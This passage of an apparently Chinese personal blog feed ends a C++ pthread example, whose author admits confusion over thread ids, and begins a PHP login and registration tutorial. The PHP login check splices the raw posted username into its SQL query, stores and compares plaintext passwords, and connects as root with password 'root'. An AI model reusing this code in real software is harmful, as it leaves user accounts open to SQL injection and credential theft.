class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;iostream&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;cstdlib&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;pthread.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;unistd.h&gt;//包含unix系统中的各种原语函数，如sleep、read、write、fork，unistd.h在unix中类似于window中的windows.h</span></span></span><br><span class="line"> </span><br><span class="line"><span class="keyword">using</span> <span class="keyword">namespace</span> <span class="built_in">std</span>;</span><br><span class="line"> </span><br><span class="line"><span class="meta">#<span class="meta-keyword">define</span> NUM_THREADS     5</span></span><br><span class="line"> </span><br><span class="line"><span class="function"><span class="keyword">void</span> *<span class="title">wait</span><span class="params">(<span class="keyword">void</span> *t)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">   <span class="keyword">int</span> i;</span><br><span class="line">   <span class="keyword">long</span> tid;</span><br><span class="line"> </span><br><span class="line">   tid = (<span class="keyword">long</span>)t;</span><br><span class="line"> </span><br><span class="line">   sleep(<span class="number">1</span>);</span><br><span class="line">   <span class="built_in">cout</span> &lt;&lt; <span class="string">"Sleeping in thread "</span> &lt;&lt; <span class="built_in">endl</span>;</span><br><span class="line">   <span class="built_in">cout</span> &lt;&lt; <span class="string">"Thread with id : "</span> &lt;&lt; tid &lt;&lt; <span class="string">"  ...exiting "</span> &lt;&lt; <span class="built_in">endl</span>;</span><br><span class="line">   pthread_exit(<span class="literal">NULL</span>);</span><br><span class="line">&#125;</span><br><span class="line"> </span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">main</span> <span class="params">()</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">   <span class="keyword">int</span> rc;</span><br><span class="line">   <span class="keyword">int</span> i;</span><br><span class="line">   <span class="keyword">pthread_t</span> threads[NUM_THREADS];</span><br><span class="line">   <span class="keyword">pthread_attr_t</span> attr;</span><br><span class="line">   <span class="keyword">void</span> *status;</span><br><span class="line"> </span><br><span class="line">   <span class="comment">// 初始化并设置线程为可连接的（joinable）</span></span><br><span class="line">   <span class="comment">// 属性对象必须初始化，否则属性不能生效，创建线程时将返回错误。</span></span><br><span class="line">   <span class="comment">// 函数将对象属性初始化为其缺省值，并分配一些存储空间，所以需要下面的函数删除初始化期间分配的存储空间。</span></span><br><span class="line">   <span class="comment">// 参数:指向一个线程属性的指针。</span></span><br><span class="line">   pthread_attr_init(&amp;attr);<span class="comment">//没有这句会发生Segmentation fault (core dumped)</span></span><br><span class="line">   pthread_attr_setdetachstate(&amp;attr, PTHREAD_CREATE_JOINABLE);</span><br><span class="line"> </span><br><span class="line">   <span class="keyword">for</span>( i=<span class="number">0</span>; i &lt; NUM_THREADS; i++ )&#123;</span><br><span class="line">      <span class="built_in">cout</span> &lt;&lt; <span class="string">"main() : creating thread, "</span> &lt;&lt; i &lt;&lt; <span class="built_in">endl</span>;</span><br><span class="line">      rc = pthread_create(&amp;threads[i], <span class="literal">NULL</span>, wait, (<span class="keyword">void</span> *)&amp;i );</span><br><span class="line">      <span class="keyword">if</span> (rc)&#123;</span><br><span class="line">         <span class="built_in">cout</span> &lt;&lt; <span class="string">"Error:unable to create thread,"</span> &lt;&lt; rc &lt;&lt; <span class="built_in">endl</span>;</span><br><span class="line">         <span class="built_in">exit</span>(<span class="number">-1</span>);</span><br><span class="line">      &#125;</span><br><span class="line">   &#125;</span><br><span class="line"> </span><br><span class="line">   <span class="comment">// 删除属性，并等待其他线。</span></span><br><span class="line">   <span class="comment">// 属性对象被销毁，并不影响线程的属性。</span></span><br><span class="line">   pthread_attr_destroy(&amp;attr);</span><br><span class="line">   <span class="keyword">for</span>( i=<span class="number">0</span>; i &lt; NUM_THREADS; i++ )&#123;</span><br><span class="line">      rc = pthread_join(threads[i], &amp;status);</span><br><span class="line">      <span class="keyword">if</span> (rc)&#123;</span><br><span class="line">         <span class="built_in">cout</span> &lt;&lt; <span class="string">"Error:unable to join,"</span> &lt;&lt; rc &lt;&lt; <span class="built_in">endl</span>;</span><br><span class="line">         <span class="built_in">exit</span>(<span class="number">-1</span>);</span><br><span class="line">      &#125;</span><br><span class="line">      <span class="built_in">cout</span> &lt;&lt; <span class="string">"Main: completed thread id :"</span> &lt;&lt; i ;</span><br><span class="line">      <span class="built_in">cout</span> &lt;&lt; <span class="string">"  exiting with status :"</span> &lt;&lt; status &lt;&lt; <span class="built_in">endl</span>;</span><br><span class="line">   &#125;</span><br><span class="line"> </span><br><span class="line">   <span class="built_in">cout</span> &lt;&lt; <span class="string">"Main: program exiting."</span> &lt;&lt; <span class="built_in">endl</span>;</span><br><span class="line">   pthread_exit(<span class="literal">NULL</span>);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>在ubuntu16编译后结果如下：</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br></pre></td><td class="code"><pre><span class="line">main() : creating thread, 0</span><br><span class="line">main() : creating thread, 1</span><br><span class="line">main() : creating thread, 2</span><br><span class="line">main() : creating thread, 3</span><br><span class="line">main() : creating thread, 4</span><br><span class="line">Sleeping in thread </span><br><span class="line">Thread with id : 140724715288192  ...exiting </span><br><span class="line">Sleeping in thread </span><br><span class="line">Thread with id : 140724715288192  ...exiting </span><br><span class="line">Sleeping in thread </span><br><span class="line">Thread with id : 140724715288192  ...exiting </span><br><span class="line">Sleeping in thread </span><br><span class="line">Thread with id : 140724715288192  ...exiting </span><br><span class="line">Sleeping in thread </span><br><span class="line">Thread with id : 140724715288192  ...exiting </span><br><span class="line">Main: completed thread id :0  exiting with status :0</span><br><span class="line">Main: completed thread id :1  exiting with status :0</span><br><span class="line">Main: completed thread id :2  exiting with status :0</span><br><span class="line">Main: completed thread id :3  exiting with status :0</span><br><span class="line">Main: completed thread id :4  exiting with status :0</span><br><span class="line">Main: program exiting.</span><br></pre></td></tr></table></figure><p>这里有一点很困惑我，把<code>tid=(long)t;</code>改成<code>tid=*（（long*）t）</code>后，每个线程的id显示都是0。</p><p>显示如下：</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br></pre></td><td class="code"><pre><span class="line">main() : creating thread, 0</span><br><span class="line">main() : creating thread, 1</span><br><span class="line">main() : creating thread, 2</span><br><span class="line">main() : creating thread, 3</span><br><span class="line">main() : creating thread, 4</span><br><span class="line">Sleeping in thread </span><br><span class="line">Thread with id : 0  ...exiting </span><br><span class="line">Sleeping in thread </span><br><span class="line">Thread with id : 0  ...exiting </span><br><span class="line">Sleeping in thread </span><br><span class="line">Thread with id : 0  ...exiting </span><br><span class="line">Sleeping in thread </span><br><span class="line">Thread with id : 0  ...exiting </span><br><span class="line">Sleeping in thread </span><br><span class="line">Thread with id : 0  ...exiting </span><br><span class="line">Main: completed thread id :0  exiting with status :0</span><br><span class="line">Main: completed thread id :1  exiting with status :0</span><br><span class="line">Main: completed thread id :2  exiting with status :0</span><br><span class="line">Main: completed thread id :3  exiting with status :0</span><br><span class="line">Main: completed thread id :4  exiting with status :0</span><br><span class="line">Main: program exiting.</span><br></pre></td></tr></table></figure><p>不论是储存线程创建时的值，还是公用同一片int空间，都不应该是0啊，如果是公用一个int的空间那在for循环结束后i的内存空间的值也应该是5。这里目前还弄不明白。</p><h2 id="参考"><a href="#参考" class="headerlink" title="参考"></a>参考</h2><p><a href="https://www.cnblogs.com/shuqingstudy/p/9747004.html" target="_blank" rel="noopener">https://www.cnblogs.com/shuqingstudy/p/9747004.html</a> C++中的并发与多线程</p><p><a href="https://www.runoob.com/cplusplus/cpp-multithreading.html" target="_blank" rel="noopener">https://www.runoob.com/cplusplus/cpp-multithreading.html</a> 菜鸟课程C++多线程</p><p><a href="https://baike.baidu.com/item/%E5%8F%AF%E7%A7%BB%E6%A4%8D%E6%93%8D%E4%BD%9C%E7%B3%BB%E7%BB%9F%E6%8E%A5%E5%8F%A3/12718298?fr=aladdin&amp;fromtitle=POSIX&amp;fromid=3792413" target="_blank" rel="noopener">https://baike.baidu.com/item/%E5%8F%AF%E7%A7%BB%E6%A4%8D%E6%93%8D%E4%BD%9C%E7%B3%BB%E7%BB%9F%E6%8E%A5%E5%8F%A3/12718298?fr=aladdin&amp;fromtitle=POSIX&amp;fromid=3792413</a> 百度百科可移植操作系统接口</p><p><a href="https://www.cnblogs.com/x_wukong/p/5671137.html" target="_blank" rel="noopener">https://www.cnblogs.com/x_wukong/p/5671137.html</a> linux的&lt;pthread.h&gt;</p><p><a href="https://blog.csdn.net/liuzhanchen1987/article/details/8009701" target="_blank" rel="noopener">https://blog.csdn.net/liuzhanchen1987/article/details/8009701</a> linux标准库#include</p><p><a href="https://www.cnblogs.com/leijiangtao/p/3995826.html" target="_blank" rel="noopener">https://www.cnblogs.com/leijiangtao/p/3995826.html</a> 线程属性的初始化以及销毁</p><p><a href="https://blog.csdn.net/weibo1230123/article/details/81410241" target="_blank" rel="noopener">https://blog.csdn.net/weibo1230123/article/details/81410241</a> linux中pthread_join()与pthread_detach()详解</p>]]></content>
      
      
      
    </entry>
    
    
    
    <entry>
      <title>2019-9-21-php实现基本网站登陆与注册</title>
      <link href="/passages/2019-9-21-php%E5%AE%9E%E7%8E%B0%E5%9F%BA%E6%9C%AC%E7%BD%91%E7%AB%99%E7%99%BB%E9%99%86%E4%B8%8E%E6%B3%A8%E5%86%8C/"/>
      <url>/passages/2019-9-21-php%E5%AE%9E%E7%8E%B0%E5%9F%BA%E6%9C%AC%E7%BD%91%E7%AB%99%E7%99%BB%E9%99%86%E4%B8%8E%E6%B3%A8%E5%86%8C/</url>
      
        <content type="html"><![CDATA[<h1 id="php实现基本网站登陆与注册"><a href="#php实现基本网站登陆与注册" class="headerlink" title="php实现基本网站登陆与注册"></a>php实现基本网站登陆与注册</h1><p>基于win7虚拟机+phpstudy</p><h2 id="创建注册与登陆html页面"><a href="#创建注册与登陆html页面" class="headerlink" title="创建注册与登陆html页面"></a>创建注册与登陆html页面</h2><figure class="highlight html"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br></pre></td><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">html</span>&gt;</span></span><br><span class="line"></span><br><span class="line"><span class="tag">&lt;<span class="name">head</span>&gt;</span></span><br><span class="line"></span><br><span class="line"><span class="tag">&lt;<span class="name">meta</span> <span class="attr">http-equiv</span>=<span class="string">"Content-Type"</span> <span class="attr">content</span>=<span class="string">"text/html; charset=utf-8"</span>&gt;</span></span><br><span class="line"></span><br><span class="line"><span class="tag">&lt;<span class="name">title</span>&gt;</span>登录界面<span class="tag">&lt;/<span class="name">title</span>&gt;</span></span><br><span class="line"></span><br><span class="line"><span class="tag">&lt;/<span class="name">head</span>&gt;</span></span><br><span class="line"></span><br><span class="line"><span class="tag">&lt;<span class="name">body</span>&gt;</span></span><br><span class="line"></span><br><span class="line"><span class="tag">&lt;<span class="name">form</span> <span class="attr">method</span>=<span class="string">"post"</span> <span class="attr">action</span>=<span class="string">"login.php"</span>&gt;</span></span><br><span class="line"></span><br><span class="line">账号：</span><br><span class="line"></span><br><span class="line"><span class="tag">&lt;<span class="name">input</span> <span class="attr">type</span>=<span class="string">"text"</span> <span class="attr">name</span>=<span class="string">"usernamel"</span>&gt;</span><span class="tag">&lt;<span class="name">br</span>/&gt;</span><span class="tag">&lt;<span class="name">br</span>/&gt;</span></span><br><span class="line"></span><br><span class="line">密码：</span><br><span class="line"></span><br><span class="line"><span class="tag">&lt;<span class="name">input</span> <span class="attr">type</span>=<span class="string">"password"</span> <span class="attr">name</span>=<span class="string">"passwordl"</span>&gt;</span></span><br><span class="line"></span><br><span class="line"><span class="tag">&lt;<span class="name">input</span> <span class="attr">type</span>=<span class="string">"submit"</span> <span class="attr">value</span>=<span class="string">"登录"</span> <span class="attr">name</span>=<span class="string">"subl"</span>&gt;</span></span><br><span class="line"></span><br><span class="line"><span class="tag">&lt;<span class="name">a</span> <span class="attr">href</span>=<span class="string">"http://www.shixun.com/register.html"</span>&gt;</span>没有账号，注册<span class="tag">&lt;/<span class="name">a</span>&gt;</span></span><br><span class="line"></span><br><span class="line"><span class="tag">&lt;/<span class="name">form</span>&gt;</span></span><br><span class="line"></span><br><span class="line"><span class="tag">&lt;/<span class="name">body</span>&gt;</span></span><br><span class="line"></span><br><span class="line"><span class="tag">&lt;/<span class="name">html</span>&gt;</span></span><br></pre></td></tr></table></figure><figure class="highlight html"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br></pre></td><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">html</span>&gt;</span></span><br><span class="line"></span><br><span class="line"><span class="tag">&lt;<span class="name">head</span>&gt;</span></span><br><span class="line"></span><br><span class="line"><span class="tag">&lt;<span class="name">meta</span> <span class="attr">http-equiv</span>=<span class="string">"Content-Type"</span> <span class="attr">content</span>=<span class="string">"text/html; charset=utf-8"</span>&gt;</span></span><br><span class="line"></span><br><span class="line"><span class="tag">&lt;<span class="name">title</span>&gt;</span>注册界面<span class="tag">&lt;/<span class="name">title</span>&gt;</span></span><br><span class="line"></span><br><span class="line"><span class="tag">&lt;/<span class="name">head</span>&gt;</span></span><br><span class="line"></span><br><span class="line"><span class="tag">&lt;<span class="name">body</span>&gt;</span></span><br><span class="line"></span><br><span class="line"><span class="tag">&lt;<span class="name">form</span> <span class="attr">method</span>=<span class="string">"post"</span> <span class="attr">action</span>=<span class="string">"register.php"</span>&gt;</span></span><br><span class="line"></span><br><span class="line">姓名：<span class="tag">&lt;<span class="name">br</span>/&gt;</span><span class="tag">&lt;<span class="name">br</span>/&gt;</span></span><br><span class="line"></span><br><span class="line"><span class="tag">&lt;<span class="name">input</span> <span class="attr">type</span>=<span class="string">"text"</span> <span class="attr">name</span>=<span class="string">"username"</span>&gt;</span><span class="tag">&lt;<span class="name">br</span>/&gt;</span><span class="tag">&lt;<span class="name">br</span>/&gt;</span></span><br><span class="line"></span><br><span class="line">年龄：<span class="tag">&lt;<span class="name">br</span>/&gt;</span><span class="tag">&lt;<span class="name">br</span>/&gt;</span></span><br><span class="line"></span><br><span class="line"><span class="tag">&lt;<span class="name">input</span> <span class="attr">type</span>=<span class="string">"text"</span> <span class="attr">name</span>=<span class="string">"userage"</span>&gt;</span><span class="tag">&lt;<span class="name">br</span>/&gt;</span><span class="tag">&lt;<span class="name">br</span>/&gt;</span></span><br><span class="line"></span><br><span class="line">性别：<span class="tag">&lt;<span class="name">br</span>/&gt;</span><span class="tag">&lt;<span class="name">br</span>/&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">input</span> <span class="attr">name</span>=<span class="string">"usersex"</span> <span class="attr">type</span>=<span class="string">"radio"</span> <span class="attr">value</span>=<span class="string">"0"</span> /&gt;</span>男 </span><br><span class="line"><span class="tag">&lt;<span class="name">input</span> <span class="attr">name</span>=<span class="string">"usersex"</span> <span class="attr">type</span>=<span class="string">"radio"</span> <span class="attr">value</span>=<span class="string">"1"</span> /&gt;</span>女 </span><br><span class="line"><span class="tag">&lt;<span class="name">input</span> <span class="attr">name</span>=<span class="string">"usersex"</span> <span class="attr">type</span>=<span class="string">"radio"</span> <span class="attr">value</span>=<span class="string">"2"</span> /&gt;</span>其它 </span><br><span class="line"><span class="tag">&lt;<span class="name">br</span>/&gt;</span><span class="tag">&lt;<span class="name">br</span>/&gt;</span></span><br><span class="line"></span><br><span class="line">身份信息：<span class="tag">&lt;<span class="name">br</span>/&gt;</span><span class="tag">&lt;<span class="name">br</span>/&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">input</span> <span class="attr">type</span>=<span class="string">"text"</span> <span class="attr">name</span>=<span class="string">"userid"</span>&gt;</span><span class="tag">&lt;<span class="name">br</span>/&gt;</span><span class="tag">&lt;<span class="name">br</span>/&gt;</span></span><br><span class="line"></span><br><span class="line">账号：<span class="tag">&lt;<span class="name">br</span>/&gt;</span><span class="tag">&lt;<span class="name">br</span>/&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">input</span> <span class="attr">type</span>=<span class="string">"text"</span> <span class="attr">name</span>=<span class="string">"id"</span>&gt;</span><span class="tag">&lt;<span class="name">br</span>/&gt;</span><span class="tag">&lt;<span class="name">br</span>/&gt;</span></span><br><span class="line"></span><br><span class="line">密码:<span class="tag">&lt;<span class="name">br</span>/&gt;</span><span class="tag">&lt;<span class="name">br</span>/&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">input</span> <span class="attr">type</span>=<span class="string">"password"</span> <span class="attr">name</span>=<span class="string">"password"</span>&gt;</span></span><br><span class="line"></span><br><span class="line"><span class="tag">&lt;<span class="name">br</span>/&gt;</span><span class="tag">&lt;<span class="name">br</span>/&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">input</span> <span class="attr">type</span>=<span class="string">"submit"</span> <span class="attr">value</span>=<span class="string">"注册"</span> <span class="attr">name</span>=<span class="string">"sub"</span>&gt;</span></span><br><span class="line"></span><br><span class="line"><span class="tag">&lt;/<span class="name">form</span>&gt;</span></span><br><span class="line"></span><br><span class="line"><span class="tag">&lt;/<span class="name">body</span>&gt;</span></span><br><span class="line"></span><br><span class="line"><span class="tag">&lt;/<span class="name">html</span>&gt;</span></span><br></pre></td></tr></table></figure><h2 id="注册和登陆检查-php（连接mysql数据库）"><a href="#注册和登陆检查-php（连接mysql数据库）" class="headerlink" title="注册和登陆检查-php（连接mysql数据库）"></a>注册和登陆检查-php（连接mysql数据库）</h2><p>登陆检查php</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"></span><br><span class="line">header(<span class="string">"Content-type:text/html;charset=utf-8"</span>);</span><br><span class="line"></span><br><span class="line">$link=mysql_connect(<span class="string">"localhost"</span>,<span class="string">"root"</span>,<span class="string">"root"</span>);</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span>($link)</span><br><span class="line"></span><br><span class="line">&#123;</span><br><span class="line">  $select=mysql_select_db(<span class="string">"login"</span>,$link);</span><br><span class="line"></span><br><span class="line">  <span class="keyword">if</span>($select)</span><br><span class="line"></span><br><span class="line">  &#123;</span><br><span class="line">    <span class="keyword">if</span>(<span class="keyword">isset</span>($_POST[<span class="string">"subl"</span>]))</span><br><span class="line"></span><br><span class="line">    &#123;</span><br><span class="line">      $name=$_POST[<span class="string">"usernamel"</span>];</span><br><span class="line"></span><br><span class="line">      $password=$_POST[<span class="string">"passwordl"</span>];</span><br><span class="line"></span><br><span class="line">      <span class="keyword">if</span>($name==<span class="string">""</span>||$password==<span class="string">""</span>)<span class="comment">//判断是否为空</span></span><br><span class="line"></span><br><span class="line">      &#123;</span><br><span class="line">        <span class="keyword">echo</span><span class="string">"&lt;script type="</span>.<span class="string">"\""</span>.<span class="string">"text/javascript"</span>.<span class="string">"\""</span>.<span class="string">"&gt;"</span>.<span class="string">"window.alert"</span>.<span class="string">"("</span>.<span class="string">"\""</span>.<span class="string">"请填写正确的信息！"</span>.<span class="string">"\""</span>.<span class="string">")"</span>.<span class="string">";"</span>.<span class="string">"&lt;/script&gt;"</span>;</span><br><span class="line"></span><br><span class="line">        <span class="keyword">echo</span><span class="string">"&lt;script type="</span>.<span class="string">"\""</span>.<span class="string">"text/javascript"</span>.<span class="string">"\""</span>.<span class="string">"&gt;"</span>.<span class="string">"window.location="</span>.<span class="string">"\""</span>.<span class="string">"http://www.shixun.com/login.html"</span>.<span class="string">"\""</span>.<span class="string">"&lt;/script&gt;"</span>;</span><br><span class="line"></span><br><span class="line">        <span class="keyword">exit</span>;</span><br><span class="line">      &#125;</span><br><span class="line"></span><br><span class="line">      $str=<span class="string">"select password from register where id="</span>.<span class="string">"'"</span>.<span class="string">"$name"</span>.<span class="string">"'"</span>;</span><br><span class="line"></span><br><span class="line">      mysql_query(<span class="string">'SET NAMES UTF8'</span>);</span><br><span class="line">  </span><br><span class="line">  $result=mysql_query($str,$link);</span><br><span class="line"></span><br><span class="line">      $pass=mysql_fetch_row($result);</span><br><span class="line"></span><br><span class="line">      $pa=$pass[<span class="number">0</span>];</span><br><span class="line"></span><br><span class="line">      <span class="keyword">if</span>($pa==$password)<span class="comment">//判断密码与注册时密码是否一致</span></span><br><span class="line"></span><br><span class="line">      &#123;</span><br><span class="line">        <span class="keyword">echo</span><span class="string">"登录成功！"</span>;</span><br><span class="line">      &#125;</span><br><span class="line">  <span class="keyword">else</span></span><br><span class="line">      &#123;  </span><br><span class="line">        <span class="keyword">echo</span><span class="string">"&lt;script type="</span>.<span class="string">"\""</span>.<span class="string">"text/javascript"</span>.<span class="string">"\""</span>.<span class="string">"&gt;"</span>.<span class="string">"window.alert"</span>.<span class="string">"("</span>.<span class="string">"\""</span>.<span class="string">"登录失败！"</span>.<span class="string">"\""</span>.<span class="string">")"</span>.<span class="string">";"</span>.<span class="string">"&lt;/script&gt;"</span>;</span><br><span class="line"></span><br><span class="line">        <span class="keyword">echo</span><span class="string">"&lt;script type="</span>.<span class="string">"\""</span>.<span class="string">"text/javascript"</span>.<span class="string">"\""</span>.<span class="string">"&gt;"</span>.<span class="string">"window.location="</span>.<span class="string">"\""</span>.<span class="string">"http://www.shixun.com/login.html"</span>.<span class="string">"\""</span>.<span class="string">"&lt;/script&gt;"</span>;</span><br><span class="line"></span><br><span class="line">      &#125;</span><br><span class="line">    &#125;</span><br><span class="line">  &#125;</span><br><span class="line">&#125;</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure><p>注册检查</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br><span class="line">105</span><br><span class="line">106</span><br><span class="line">107</span><br><span class="line">108</span><br><span class="line">109</span><br><span class="line">110</span><br><span class="line">111</span><br><span class="line">112</span><br><span class="line">113</span><br><span class="line">114</span><br><span class="line">115</span><br><span class="line">116</span><br><span class="line">117</span><br><span class="line">118</span><br><span class="line">119</span><br><span class="line">120</span><br><span class="line">121</span><br><span class="line">122</span><br><span class="line">123</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"></span><br><span class="line">$link=mysql_connect(<span class="string">"localhost"</span>,<span class="string">"root"</span>,<span class="string">"root"</span>);<span class="comment">//链接数据库</span></span><br><span class="line"></span><br><span class="line">header(<span class="string">"Content-type:text/html;charset=utf-8"</span>);</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span>($link)</span><br><span class="line"></span><br><span class="line">  &#123;  </span><br><span class="line"></span><br><span class="line">    <span class="comment">//echo"链接数据库成功";</span></span><br><span class="line"></span><br><span class="line">    $select=mysql_select_db(<span class="string">"login"</span>,$link);<span class="comment">//选择数据库</span></span><br><span class="line"></span><br><span class="line">    <span class="keyword">if</span>($select)</span><br><span class="line"></span><br><span class="line">    &#123;</span><br><span class="line"></span><br><span class="line">      <span 